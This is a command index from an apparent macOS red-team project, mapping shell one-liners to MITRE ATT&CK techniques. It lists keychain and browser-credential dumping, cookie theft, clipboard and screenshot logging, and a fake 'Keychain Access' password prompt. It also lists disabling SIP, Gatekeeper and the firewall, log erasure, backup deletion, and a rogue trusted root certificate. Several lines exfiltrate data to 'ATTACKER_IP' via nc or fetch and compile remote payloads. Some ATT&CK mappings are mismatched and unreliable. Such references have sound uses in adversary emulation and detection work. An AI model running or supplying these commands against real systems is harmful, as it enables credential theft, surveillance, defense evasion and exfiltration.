# Command Index 
<p>
  <span style="display: inline-block; padding: 5px 10px; background-color: #007bff; color: white; border-radius: 5px; font-size: 0.8em;">Good Stuff</span>
</br>
</p>

This document provides an index of commands used in our security scripts, organized by MITRE ATT&CK techniques. It serves as a quick reference for the various commands implemented across different scripts.


### Purpose
- To provide a centralized reference for all commands used in the project
- To map commands to their corresponding MITRE ATT&CK techniques
- To facilitate easier navigation and understanding of the project's capabilities

##

### Assumptions
- The reader has basic knowledge of MITRE ATT&CK framework
- The commands are intended for use on MacOS systems
- The listed commands are implemented in the corresponding scripts

##

### Usage
Refer to this document to:
- Quickly find commands related to specific MITRE ATT&CK techniques
- Understand the range of capabilities implemented in the project
- Locate the source scripts for specific commands

##

### Note
The commands listed here are for reference only. Always refer to the actual script implementations for the most up-to-date and context-specific usage of these commands.

##

### T1087.001 - Account Discovery: Local Account

**Source: accounts.sh**

| Description | Command |
|-------------|---------|
| List user directories | `ls -la /Users` |
| Enumerate local user accounts | `dscl . -list /Users` |
| Display passwd file content | `cat /etc/passwd` |
| Show current user's ID and groups | `id` |
| List logged-in users | `who` |
| Read login window preferences | `defaults read /Library/Preferences/com.apple.loginwindow` |
| Query user information | `dscacheutil -q user` |
| Query group information | `dscacheutil -q group` |
| List local groups | `dscl . -list /Groups` |
| Search group file | `grep /etc/group` |
| Display current user's group IDs | `id -G` |
| Show current user's group memberships | `groups` |

**Source: TBD**

| Description | Command |
|-------------|---------|
| Local user enumeration | `dscl . -list /Users` |
| Active Directory user enumeration | `dscl "/Active Directory/TEST/All Domains" -list /Users` |
| Local user information gathering | `dscl . -read /Users/$USERNAME` |
| Active Directory user information gathering | `dscl "/Active Directory/TEST/All Domains" -read /Users/$USERNAME` |
| Local group enumeration | `dscl . -list /Groups` |
| Active Directory group enumeration | `dscl "/Active Directory/TEST/All Domains" -list /Groups` |
| Local group information gathering | `dscl . -read /Groups/$GROUPNAME` |
| Active Directory group information gathering | `dscl "/Active Directory/TEST/All Domains" -read /Groups/$GROUPNAME` |
| Computer enumration | `dscl  "/Active Directory/TEST/All Domains" -list /Computers` |
| Share enumration | `dscl . -list /SharePoints` |
| Password policy discovery | `dscl . -read /Config/shadowhash` |
| Lookup  a user | `dscacheutil -q user -a name <USER_NAME>` |
| Lookup all users | `dscacheutil -q user` |

##

### T1555.001 - Credentials from Password Stores: Keychain

**Source: keychain.sh**

| Description | Command |
|-------------|---------|
| Dump login keychain contents | `security dump-keychain login.keychain` |
| Find generic password | `security find-generic-password -a "$ACCOUNT" -s "$SERVICE"` |
| Find internet password | `security find-internet-password -a "$ACCOUNT" -s "$SERVER"` |
| Find and print certificates | `security find-certificate -a -p` |
| Unlock login keychain | `security unlock-keychain login.keychain` |
| Export certificates in PEM format | `security export -k login.keychain -t certs -f pem -o "$OUTPUT_FILE"` |
| Find code signing identities | `security find-identity -v -p codesigning` |
| Extract readable strings from keychain | `strings ~/Library/Keychains/login.keychain-db` |
| Dump entire keychain database | `sqlite3 ~/Library/Keychains/login.keychain-db .dump` |

**Source: TBD**

| Description | Command |
|-------------|---------|
| Dump credentials, keys, certificates, and other senstive information from Keychain | `sudo security dump-keychain -d login.keychain` |
| Retrieve Chrome's "Chrome Safe Storage" password manager secret | `security find-generic-password -w -s "Chrome Safe Storage"` |
| Add an arbitrary trusted certificate to aid a MITM attack | `security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain bad_cert.crt` |

##

### T1518.001 - Security Software Discovery

**Source: security_software.sh**

| Description | Command |
|-------------|---------|
| List files in Applications directory | `ls -laR /Applications/` |
| List directories in Applications folder | `ls -d /Applications/` |
| List running processes | `ps -axrww \| grep -v grep \| grep --color=always` |
| Get detailed app information | `system_profiler SPApplicationsDataType \| grep --color=always -A 8` |
| Check Gatekeeper status | `spctl --status` |
| Assess app against Gatekeeper | `spctl --assess --verbose /Applications/Safari.app` |
| Check XProtect status | `system_profiler SPInstallHistoryDataType \| grep -A 5 "XProtect"` |
| Check MRT status | `system_profiler SPInstallHistoryDataType \| grep -A 5 "MRT"` |
| Check TCC status | `tccutil reset All` |
| Check for antivirus processes | `ps -axrww \| grep -v grep \| grep --color=always "MacKeeper\|Avast\|Avira\|Bitdefender\|ESET\|F-Secure\|Kaspersky\|McAfee\|Norton\|Panda\|Sophos\|Symantec\|Trend Micro\|Webroot\|Malwarebytes"` |
| Check for EDR processes | `ps -axrww \| grep -v grep \| grep --color=always "CrowdStrike\|Carbon Black\|SentinelOne\|Cylance\|FireEye\|Cisco AMP\|Palo Alto\|Microsoft Defender\|Trend Micro Apex One\|Sophos Intercept X"` |
| Check for Objective-See tools | `ps -axrww \| grep -v grep \| grep --color=always "BlockBlock\|DoNotDisturb\|LuLu\|KnockKnock\|OverSight\|RansomWhere"` |
| List antivirus app directories | `ls -d /Applications/*Antivirus*.app /Applications/*Security*.app /Applications/*Protect*.app 2>/dev/null` |
| List EDR app directories | `ls -d /Applications/CrowdStrike.app /Applications/Carbon\ Black.app /Applications/SentinelOne.app /Applications/Cylance.app /Applications/FireEye.app /Applications/Cisco\ AMP.app /Applications/Cortex\ XDR.app /Applications/Microsoft\ Defender.app /Applications/Trend\ Micro*.app /Applications/Sophos*.app 2>/dev/null` |
| List Objective-See tool directories | `ls -d /Applications/BlockBlock.app /Applications/DoNotDisturb.app /Applications/LuLu.app /Applications/KnockKnock.app /Applications/OverSight.app /Applications/RansomWhere.app 2>/dev/null` |
| Get antivirus app details | `system_profiler SPApplicationsDataType \| grep -A 8 -E "Antivirus\|Security\|Protect"` |
| Get EDR app details | `system_profiler SPApplicationsDataType \| grep -A 8 -E "CrowdStrike\|Carbon Black\|SentinelOne\|Cylance\|FireEye\|Cisco AMP\|Cortex XDR\|Microsoft Defender\|Trend Micro\|Sophos"` |
| Get Objective-See tool details | `system_profiler SPApplicationsDataType \| grep -A 8 -E "BlockBlock\|DoNotDisturb\|LuLu\|KnockKnock\|OverSight\|RansomWhere"` |

**Source: TBD**

| Description | Command |
|-------------|---------|
| Determine if SIP is enabled | `csrutil status` |

##

### T1136.001 - Create Account: Local Account

**Source: guest_account.sh**

| Description | Command |
|-------------|---------|
| Enable guest account | `sudo sysadminctl -guestAccount on` |
| Disable guest account | `sudo sysadminctl -guestAccount off` |

**Source: TBD**

| Description | Command |
|-------------|---------|
| Change a user password | `dscl . passwd /Users/$USERNAME oldPassword newPassword` |
| Local account creation | `dscl -create` |
| Enable Guest Account | `sudo sysadminctl -guestAccount on` |
| Create Local User Account | `sudo sysadminctl -addUser randomUser -password "randomPassword"` |
| Create a Local Admin Account | `sudo sysadminctl -addUser randomUser -password "randomPassword" -admin` |
| Reset user password | `sudo sysadminctl -resetPasswordFor randomUser -newPassword "randomPassword"` |

##

### T1033 - System Owner/User Discovery

**Source: shellbelt.sh**

| Description | Command |
|-------------|---------|
| Display current username | `whoami` |

**Source: TBD**

| Description | Command |
|-------------|---------|
| Use sysctl to gather macOS hardware info. | `sysctl -n hw.model` |
| Retrieving macOS Version Information | `sw_vers` |
| Retrieving macOS Product Version | `sw_vers -productVersion` |
| Retrieving macOS Product Name | `sw_vers -productName` |
| Retrieving macOS Build Version | `sw_vers -buildVersion` |
| Get nvram variables | `nvram -p` |
| Retrieves the Active Directory configuration | `dsconfigad -show` |
| Retrieves the Active Directory name | `dsconfigad -show |awk '/Active Directory Domain/{print $NF}'` |
| Use ioreg to check whether the remote macOS screen is locked. | `ioreg -n Root -d1 -a | grep CGSSession` |
| Use ioreg to check whether the host is on a physical machine or a VM | `ioreg -rd1 -c IOPlatformExpertDevice` |
| Use ioreg to check USB device vendor names | `ioreg -rd1 -c IOUSBHostDevice` |
| Check all ioreg properties for hypervisor names. | `ioreg -l` |
| Listing the available datatypes | `system_profiler -listDataTypes` |
| Print hardware information | `system_profiler SPHardwareDataType` |
| Print software information | `system_profiler SPSoftwareDataType` |
| Print the information of developer tools | `system_profiler SPDeveloperToolsDataType` |
| Print power and battery information | `system_profiler SPPowerDataType` |

##

### T1057 - Process Discovery

**Source: shellbelt.sh**

| Description | Command |
|-------------|---------|
| List all running processes | `ps -axrww \| grep -v grep \| grep --color=always` |

**Source: TBD**

| Description | Command |
|-------------|---------|
| List kernel extensions | `kextstat` |

##

### T1217 - Browser Information Discovery

**Source: [browser_history.sh](../../ttp/discovery/browser_history.sh)**

| Description | Procedure | Data Source | Data Component | Detections |
|-------------|-----------|-------------|----------------|------------|
| Query Safari history | ```sqlite3 -separator '|' "$HOME/Library/Safari/History.db" "SELECT hi.domain_expansion as domain, hv.title, datetime(hv.visit_time + 978307200, 'unixepoch', 'localtime') as visit_date, hi.url, hi.visit_count FROM history_items hi JOIN history_visits hv ON hi.id = hv.history_item WHERE hv.visit_time > (strftime('%s', 'now') - 978307200 - ($INPUT_DAYS * 86400)) ORDER BY hv.visit_time DESC"``` | File | File Access | Monitor for access to Safari history database |
| Query Chrome history | ```sqlite3 -separator '|' "$HOME/Library/Application Support/Google/Chrome/Default/History" "SELECT url, title, datetime(last_visit_time/1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime') as last_visit, visit_count FROM urls WHERE last_visit_time > (strftime('%s', 'now') - $INPUT_DAYS * 86400) * 1000000 ORDER BY last_visit_time DESC"``` | File | File Access | Monitor for access to Chrome history database |
| Query Firefox history | ```sqlite3 -separator '|' "$FIREFOX_PROFILE/places.sqlite" "SELECT url, title, datetime(last_visit_date/1000000, 'unixepoch', 'localtime') as last_visit, visit_count FROM moz_places WHERE last_visit_date > (strftime('%s', 'now') - $INPUT_DAYS * 86400) * 1000000 ORDER BY last_visit_date DESC"``` | File | File Access | Monitor for access to Firefox history database |
| Query Brave history | ```sqlite3 -separator '|' "$HOME/Library/Application Support/BraveSoftware/Brave-Browser/Default/History" "SELECT url, title, datetime(last_visit_time/1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime') as last_visit, visit_count FROM urls WHERE last_visit_time > (strftime('%s', 'now') - $INPUT_DAYS * 86400) * 1000000 ORDER BY last_visit_time DESC"``` | File | File Access | Monitor for access to Brave history database |

## T1041 - Exfiltration Over C2 Channel

**Source: [browser_history.sh](../../ttp/discovery/browser_history.sh)**

| Description | Procedure | Data Source | Data Component | Detections |
|-------------|-----------|-------------|----------------|------------|
| Exfiltrate data via HTTP | `exfiltrate_http` | Network Traffic | Network Connection Creation | Monitor for unexpected outbound HTTP connections |
| Exfiltrate data via DNS | `exfiltrate_dns` | Network Traffic | Network Connection Creation | Monitor for unusual DNS queries or data patterns in DNS traffic |

**Source: TBD**

| Description | Command |
|-------------|---------|
| Enable SMB Guest Access | `sudo sysadminctl -smbGuestAccess on` |
| Enable AFP Guest Access | `sudo sysadminctl -afpGuestAccess on` |

## T1027 - Obfuscated Files or Information

**Source: [browser_history.sh](../../ttp/discovery/browser_history.sh)**

| Description | Procedure | Data Source | Data Component | Detections |
|-------------|-----------|-------------|----------------|------------|
| Encode output | `encode_output` | Process | Process Creation | Monitor for execution of encoding commands or libraries |
| Encrypt output | `encrypt_output` | Process | Process Creation | Monitor for execution of encryption commands or libraries |

## T1140 - Deobfuscate/Decode Files or Information

**Source: [browser_history.sh](../../ttp/discovery/browser_history.sh)**

| Description | Procedure | Data Source | Data Component | Detections |
|-------------|-----------|-------------|----------------|------------|
| Encode output | `encode_output` | Process | Process Creation | Monitor for execution of encoding/decoding commands or libraries |

## T1059.006 - Command and Scripting Interpreter: Python

**Source: [browser_history.sh](../../ttp/discovery/browser_history.sh)**

| Description | Procedure | Data Source | Data Component | Detections |
|-------------|-----------|-------------|----------------|------------|
| Encode output using Perl | ```perl -e 'use MIME::Base64; print encode_base64(join("", <STDIN>));'``` | Process | Process Creation | Monitor for execution of Perl with encoding commands |

**Source: TBD**

| Description | Command |
|-------------|---------|
| Execute Swift code file | `swift mycode.swift` |
| Execute Swift one-liner before swift 5.8 / Xcode 14.3 Beta 1 | `echo 'print("loobins")' | swift -` |
| Execute Swift one-liner with swift 5.8 / Xcode 14.3 Beta 1 or greater | `swift -e 'import Foundation; let process = Process(); process.executableURL = URL(fileURLWithPath:"/bin/bash"); process.arguments = ["-c", "ls -alh"]; let stdout = Pipe(); let stderr = Pipe(); process.standardOutput = stdout; process.standardError = stderr; try process.run(); print(String(decoding: stdout.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self)); print(String(decoding: stderr.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self));'` |

### T1046 - Network Service Discovery

**Source: [network_service.sh](../../ttp/discovery/network_service.sh)**

| Description | Command | Data Source | Data Component | Detections |
|-------------|---------|-------------|----------------|------------|
| List network services | `launchctl list \| grep -i "net\|web\|ftp\|ssh\|smb\|afp"` | Process | Process Creation | Monitor for launchctl list commands |
| Network service states | `scutil --nc list` | Process | Process Creation | Monitor for scutil network commands |
| Bonjour service discovery | `dns-sd -B _service._tcp .` | Process | Process Creation | Monitor for dns-sd commands |
| mDNS service status | `ps aux \| grep mDNSResponder` | Process | Process Creation | Monitor for mDNS process queries |
| Network memory analysis | `vmmap $PID \| grep -iE 'network\|socket'` | Process | Process Creation | Monitor for vmmap commands |
| Network connections | `lsof -i -n -P` | Process | Process Creation | Monitor for lsof network commands |
| Network syscalls | `dtrace -n 'syscall::socket*:entry'` | Process | Process Creation | Monitor for dtrace network syscall tracing |
| Network shares | `mdfind 'kMDItemFSType == "smbfs"'` | Process | Process Creation | Monitor for mdfind network share queries |
| Sharing services | `sharing -l` | Process | Process Creation | Monitor for sharing command usage |
| Network routes | `route -n get default` | Process | Process Creation | Monitor for route command usage |
| ARP cache | `arp -a` | Process | Process Creation | Monitor for arp command usage |
| Network quality | `networkQuality -v` | Process | Process Creation | Monitor for networkQuality command usage |

**Source: TBD**

| Description | Command |
|-------------|---------|
| DNS configuration | `scutil --dns` |
| Proxy configuration | `scutil --proxy` |
| Network reachability | `scutil -r { nodename | address | local-address remote-address }` |
| Hostname, localhost name and computername | `scutil --get { HostName | LocalHostName | ComputerName }` |
| Discover SSH hosts | `dns-sd -B _ssh._tcp` |
| Discover web hosts | `dns-sd -B _http._tcp` |
| Discover hosts serving remote screen sharing | `dns-sd -B _rfb._tcp` |
| Discover hosts serving SMB | `dns-sd -B _smb._tcp` |
| network device enumeration | `networksetup -listnetworkserviceorder` |
| Detect connected network hardware | `networksetup -detectnewhardware` |
| network device enumeration | `networksetup -listallhardwareports` |
| network device enumeration | `networksetup -listallnetworkservices` |
| DNS server enumeration | `networksetup -getdnsservers Wi-Fi` |
| Enumerate configured web proxy URL for an interface | `networksetup -getautoproxyurl "Thunderbolt Ethernet"` |
| Enumerate configured web proxy for an interface | `networksetup -getwebproxy "Wi-Fi"` |

## T1543.001 - Create or Modify System Process: Launch Agent

**Source: TBD**

| Description | Command |
|-------------|---------|
| Use launchctl to execute an application | `sudo launchctl load /Library/LaunchAgent/com.apple.installer` |
| Persistent launch agent | `launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist` |

## T1055 - Process Injection

**Source: TBD**

| Description | Command |
|-------------|---------|
| Execute malicious dynamic library (.dylib) from standard input | `echo "load bad.dylib" | tclsh` |
| Execute malicious dynamic library (.dylib) from standard input | `ssh-keygen -D /private/tmp/evil.dylib` |

## T1005 - Data from Local System

**Source: TBD**

| Description | Command |
|-------------|---------|
| Use pbpaste to collect sensitive clipboard data | `while true; do echo $(pbpaste) >> loot.txt; sleep 10; done` |
| Use the osascript binary to gather sensitive clipboard data | `while true; do echo $(osascript -e 'return (the clipboard)') >> clipdata.txt; sleep 10; done` |
| Use the osascript binary to gather system information | `osascript -e 'return (system info)'` |
| Continously capture screenshots | `while true; do ts=$(date +"%Y%m%d-%H%M%S"); o="/tmp/screenshots"; screencapture -x "$o/ss-$ts.png"; sleep 10; done` |
| Copy and compress sensitive data locally | `ditto -c -k --sequesterRsrc --keepParent /home/user/sensitive-files /tmp/l00t.zip` |
| Copy and compress sensitive data locally | `dd if=/etc/passwd | streamzip - stream | nc ATTACKER_IP PORT` |
| Iterate through a directory to GetFileInfo | `for FILE in ~/Downloads/*; do echo $(GetFileInfo $FILE) >> fileinfo.txt; sleep 2; done` |
| Use mdfind to provide live updates to the number of files matching the query | `mdfind -live passw` |
| Use mdfind to search for AWS Keys | `mdfind 'kMDItemTextContent == AKIA || kMDItemDisplayName = *AKIA* -onlyin ~'` |
| Export local host users | `dsexport local_users.txt /Local/Default dsRecTypeStandard:Users` |
| Export local host groups | `dsexport local_groups.txt /Local/Default dsRecTypeStandard:Groups` |
| Get apps with Full Disk access | `sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db 'select client from access where auth_value and service = "kTCCServiceSystemPolicyAllFiles"'` |
| Get Firefox cookie data | `killall firefox; find ~/Library/Application\ Support/Firefox/Profiles/. | grep cookies.sqlite | xargs -I {} sqlite3 {} "select * from moz_cookies"` |
| View URL associated with file downloads | `sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV* 'select LSQuarantineDataURLString from LSQuarantineEvent'` |
| Enumerate the users who are currently logged into the system. | `last | grep "still logged in"` |
| Enumerate all user accounts that have logged into the system previously. | `last -t console` |
| Enumerate all hosts that have remotely logged into the system before. | `last | grep -E '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'` |
| Validate file download information | `mdls -name "kMDItemWhereFroms" -name "kMDItemDownloadedDate"` |
| Query File Paths | `xargs -0 mdls -n kMDItemPath -n kMDItemFSSize` |
| Display Login Items | `sfltool dumpbtm` |
| Search log messages for tokens | `log show --info --debug --predicate 'eventMessage CONTAINS[d] "eyJ"'` |
| Use the textutil to read several files and build a new file | `textutil -convert html Quote.doc secondQuote.doc` |
| Capture clipboard content | `pbpaste | textutil -stdin -info > Clipboard.txt` |
| Read sensitive data | `say -f /home/user/sensitive-files -i  > loot.txt;` |
| Collect clipboard data | `osascript -e 'set volume output muted true' ;   say $(pbpaste) -i  > loot.txt;` |
| Restore a backup | `tmutil restore /path/to/backup` |
| Listing the available node names | `odutil show nodenames` |
| Retrieves active session | `odutil show sessions` |
| Retrieves "Default search policy" | `odutil show configuration /Search` |
| Retrieves "Contact search policy" | `odutil show configuration /Contacts` |

## T1564.001 - Hide Artifacts: Hidden Files and Directories

**Source: TBD**

| Description | Command |
|-------------|---------|
| Set a file or directory attribute to invisible | `for FILE in ~/*; do echo $(SetFile -a V $FILE && echo $(GetFileInfo $FILE)) >> /tmp/fileinfo.txt; sleep 2; done` |
| Hide a file | `chflags hidden ~/evil` |

## T1547.006 - Boot or Logon Autostart Execution: Kernel Modules and Extensions

**Source: TBD**

| Description | Command |
|-------------|---------|
| Generate payload directory (Shlayer) | `export tmpDir="$(mktemp -d /tmp/XXXXXXXXXXXX)"` |
| Generate directory based on template file (Bundlore) | `TMP_DIR="mktemp -d -t x"` |

## T1202 - Indirect Command Execution

**Source: TBD**

| Description | Command |
|-------------|---------|
| Fork a process | `caffeinate -i /tmp/evil` |
| Prevent a sleep | `caffeinate -u -t 14400` |

## T1553.001 - Subvert Trust Controls: Gatekeeper Bypass

**Source: TBD**

| Description | Command |
|-------------|---------|
| Bypass Gatekeeper via xattr | `xattr -d com.apple.quarantine FILE` |
| Bypass Gatekeeper via xattr | `xattr -d -r com.apple.quarantine *` |
| Remove extended attributes from a file | `ditto -c -k unsigned.app app.zip ditto -x -k app.zip unsigned.app 2>/dev/null` |

## T1562.001 - Impair Defenses: Disable or Modify Tools

**Source: [modify_security_settings.yml](../../attackmacos/core/config/modify_security_settings.yml)**

| Description | Command |
|-------------|---------|
| Disable Gatekeeper auto-rearm functionality | `sudo defaults write /Library/Preferences/com.apple.security GKAutoRearm -bool NO` |
| Enable application firewall | `sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate ON` |
| Disable application firewall | `sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate OFF` |
| Enable ALF through preferences | `sudo defaults write /Library/Preferences/com.apple.alf globalstate -int 1` |
| Disable ALF through preferences | `sudo defaults write /Library/Preferences/com.apple.alf globalstate -int 0` |
| Enable Gatekeeper enforcement | `sudo spctl --master-enable` |
| Disable Gatekeeper enforcement | `sudo spctl --master-disable` |
| Block all incoming connections | `sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setblockall ON` |
| Enable firewall stealth mode | `sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setstealthmode ON` |
| Disable firewall logging | `sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setloggingmode OFF` |
| Block specific application | `sudo /usr/libexec/ApplicationFirewall/socketfilterfw --blockapp /path/to/app` |
| Disable SIP | `csrutil disable` |
| Disable authenticated-root | `csrutil authenticated-root disable` |
| Reset Login Items to Defaults | `sfltool resetbtm` |
| Remove all log messages | `log erase --all` |

**Source: TBD**

| Description | Command |
|-------------|---------|
| Disable Gatekeeper's auto rearm functionality | `sudo defaults write /Library/Preferences/com.apple.security GKAutoRearm -bool NO` |
| Enable Firewall | `sudo defaults write /Library/Preferences/com.apple.alf globalstate -int 1` |
| Disable Firewall | `sudo defaults write /Library/Preferences/com.apple.alf globalstate -int 0` |
| Disable Gatekeeper | `sudo spctl --master-disable` |
| Reset Login Items to Defaults | `sfltool resetbtm` |
| Remove all log messages | `log erase --all` |

## T1047 - Windows Management Instrumentation

**Source: TBD**

| Description | Command |
|-------------|---------|
| Get OS and browser version information | `softwareupdate --list` |
| Get OS update policy | `softwareupdate --schedule` |

## T1070.004 - Indicator Removal on Host: File Deletion

**Source: TBD**

| Description | Command |
|-------------|---------|
| Delete a local account | `sudo sysadminctl -deleteUser randomUser` |

## T1030 - Data Transfer Size Limits

**Source: TBD**

| Description | Command |
|-------------|---------|
| Mount a malicious dmg file | `hdiutil mount malicious.dmg` |
| Mount a malicious dmg file | `hdiutil attach malicious.dmg` |
| Mount a malicious iso file | `hdiutil mount malicious.iso` |
| Mount a malicious iso file | `hdiutil attach malicious.iso` |
| Exfiltrate data in dmg file | `hdiutil create -volname "Volume Name" -srcfolder /path/to/folder -ov diskimage.dmg` |
| Exfiltrate data in encrypted dmg file | `hdiutil create -encryption -stdinpass -volname "Volume Name" -srcfolder /path/to/folder -ov encrypteddiskimage.dmg` |

## T1036.005 - Masquerading: Match Legitimate Name or Location

**Source: TBD**

| Description | Command |
|-------------|---------|
| Change a file's creation and modification timestamps | `SetFile -d "04/25/2023 11:11:00" -m "04/25/2023 11:12:00" targetfile.txt` |

## T1105 - Ingress Tool Transfer

**Source: TBD**

| Description | Command |
|-------------|---------|
| Download and compile a payload | `curl https://getpayload.com/payload_code.apple_script && osacompile -x -e payload_code.apple_script -o payload.app` |
| Download file | `nscurl -k https://google.com -o /private/tmp/google` |
| Download file | `nscurl https://google.com -dl` |
| Download file | `nscurl https://google.com -dir /private/tmp/google` |
| Open a malicious file | `open Malicious.app` |
| Download a malicious file | `open -g https://mypayload.io/payload.zip; sleep 3; killall Safari` |

## T1543.004 - Create or Modify System Process: Launch Daemon

**Source: TBD**

| Description | Command |
|-------------|---------|
| Add a login item to the current user | `sudo defaults write /Library/Preferences/com.apple.loginwindow LoginHook gain_persistence.sh` |

## T1137.006 - Office Application Startup: Add-ins

**Source: TBD**

| Description | Command |
|-------------|---------|
| Show mounted servers | `defaults read com.apple.finder "ShowMountedServersOnDesktop"` |
| Get Active Directory user info from Jamf Connect | `defaults read com.jamf.connect.state` |

## T1219 - Remote Access Software

**Source: TBD**

| Description | Command |
|-------------|---------|
| Enable Remote Login | `sudo systemsetup -setremotelogin on` |
| Enable Remote Apple Events | `sudo systemsetup -setremoteappleevents on` |
| Enable safaridriver | `sudo safaridriver --enable` |

## T1187 - Forced Authentication

**Source: TBD**

| Description | Command |
|-------------|---------|
| Use the osascript binary to prompt the user for credentials | `osascript -e 'set popup to display dialog "Keychain Access wants to use the login keychain" & return & return & "Please enter the keychain password" & return default answer "" with icon file "System:Library:CoreServices:CoreTypes.bundle:Contents:Resources:FileVaultIcon.icns" with title "Authentication Needed" with hidden answer'` |

## T1059.002 - Command and Scripting Interpreter: AppleScript

**Source: TBD**

| Description | Command |
|-------------|---------|
| Use the osascript binary to execute a JXA (JavaScript for Automation) file. | `echo "ObjC.import('Cocoa');\\nObjC.import('stdlib');\\nvar currentApp = Application.currentApplication();\\ncurrentApp.includeStandardAdditions = true;\\ncurrentApp.doShellScript('open -a Calculator.app');" > calc.js && osascript -l JavaScript calc.js` |

## T1592.002 - Gather Victim Host Information: Software

**Source: TBD**

| Description | Command |
|-------------|---------|
| Use mdfind to search for apps to infect | `set appId to do shell script "mdfind kMDItemCFBundleIdentifier = '" & bundleId & "'"` |

## T1482 - Domain Trust Discovery

**Source: TBD**

| Description | Command |
|-------------|---------|
| Add a netboot server | `csrutil netboot add <address>` |
| Map infrastructure | `csrutil netboot list` |

## T1490 - Inhibit System Recovery

**Source: TBD**

| Description | Command |
|-------------|---------|
| Disable Time Machine | `tmutil disable` |
| Delete a backup | `tmutil delete /path/to/backup` |
| Exclude path from backup | `tmutil addexclusion /path/to/exclude` |

## T1574.001 - Hijack Execution Flow: DLL Search Order Hijacking

**Source: TBD**

| Description | Command |
|-------------|---------|
| DLL hjiacking | `ditto -V /path/to/malicious-library/malicious_library.dylib /path/to/target-library/original_library.dylib` |

## T1020 - Automated Exfiltration

**Source: TBD**

| Description | Command |
|-------------|---------|
| Copy, compress, and transfer sensitive data to a remote macOS host | `ditto -c --norsrc /home/user/sensitive-files - | ssh remote_host ditto -x --norsrc - /home/user/l00t` |

## T1027.005 - Obfuscated Files or Information: Indicator Removal from Tools

**Source: TBD**

| Description | Command |
|-------------|---------|
| Set app to run with dock icon hidden | `plutil -insert LSUIElement -string "1" /Applications/TargetApp.app/Contents/Info.plist` |

## T1078 - Valid Accounts

**Source: TBD**

| Description | Command |
|-------------|---------|
| Collect system DEP information. | `sudo profiles show -type enrollment` |

## T1485 - Data Destruction

**Source: TBD**

| Description | Command |
|-------------|---------|
| Remove configuration profiles. | `profiles remove -identifier com.profile.identifier -password <password>` |

## T1529 - System Shutdown/Reboot

**Source: TBD**

| Description | Command |
|-------------|---------|
| Delete the Launch Services database | `lsregister -delete` |

## T1187.001 - Forced Authentication: SMB/Windows Admin Shares

**Source: TBD**

| Description | Command |
|-------------|---------|
| Set the https web proxy for an interface | `networksetup -setsecurewebproxy "Wi-Fi" 46.226.108.171` |
| Set the http web proxy for an interface | `networksetup -setwebproxy "Wi-Fi" 46.226.108.171` |
| Set auto proxy URL for an interface | `networksetup -setautoproxyurl "Wi-Fi" $autoProxyURL` |
| Enable auto proxy state | `networksetup -setautoproxystate "Wi-Fi" on` |

## T1071.004 - Application Layer Protocol: DNS

**Source: TBD**

| Description | Command |
|-------------|---------|
| Tamper with system logs | `mkdir /tmp/snapshot\ntmutil localsnapshot\ntmutil listlocalsnapshots /\nmount_apfs -o noowners -s com.apple.TimeMachine.2023-05-01-090000.local /System/Volumes/Data /tmp/snapshot\nopen /tmp/snapshot\nsudo vim /var/log/system.log\ntmutil restore com.apple.TimeMachine.2023-05-01-090000.local` |

## T1036.004 - Masquerading: Masquerade Task or Service

**Source: TBD**

| Description | Command |
|-------------|---------|
| Force an update of the Launch Services database | `/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -f` |
| Get a list of apps and their bindings | `/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -dump | grep -E "path:|bindings:|name: | more"` |

## T1140.007 - Deobfuscate/Decode Files or Information: Dynamic Analysis

**Source: TBD**

| Description | Command |
|-------------|---------|
| Remove hidden flag | `chflags nohidden ~/evil` |

## T1219.001 - Remote Access Software: Remote Desktop Software

**Source: TBD**

| Description | Command |
|-------------|---------|
| Ad-hod codesigning an app bundle | `codesign --force --deep -s - MyApp.app` |

